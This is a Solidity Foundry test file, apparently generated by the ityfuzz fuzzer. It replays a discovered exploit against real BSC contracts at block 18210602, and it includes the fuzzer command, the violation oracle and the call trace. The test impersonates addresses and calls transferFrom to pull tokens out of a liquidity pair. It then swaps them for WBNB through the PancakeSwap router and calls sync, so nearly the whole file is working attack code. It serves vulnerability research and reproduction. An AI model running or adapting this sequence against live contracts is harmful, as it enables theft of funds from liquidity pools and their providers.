// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0xEeBc161437FA948AAb99383142564160c92D2974,0xa0787daad6062349f63b7c228cbfd5d8a3db08f1,0x3463a663de4ccc59c8b21190f81027096f18cf2a,0x6Fb2020C236BBD5a7DDEb07E14c9298642253333,0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D -c bsc --onchain-block-number 18210602 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
0x128cd0ae1a0ae7e67419111714155e1b1c6b2d8d, Reserves changed from (0x0000000000000000000000000000000000000000000000163a23ca3ddc43b14c_U256, 0x000000000000000000000000000000000000000000000000019afb81cc530e7c_U256) to (0x0000000000000000000000000000000000000000000000163a23ca3ddc43b14c_U256, 0x000000000000000000000000000000000000000000000000019afb81cc535e8f_U256)

================ Trace ================
[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   └─[1] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D.sync()
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   ├─[1] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333.transferFrom(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 0x10ED43C718714eb63d5aA57B78B54704E256024E, 20499)
   └─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333 → WETH), address(this), block.timestamp);
[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   └─[1] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D.sync()


 */

contract CEeBc is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 18210602);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        IERC20(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D).sync();
        
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333).transferFrom(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 0x10ED43C718714eb63d5aA57B78B54704E256024E, 20499);
        
        vm.startPrank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        uint256 amount0 = IERC20(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333).balanceOf(address(this));
        IERC20(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333;
        liq_path0[1] = address(weth);
        vm.deal(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        IERC20(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D).sync();
        
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
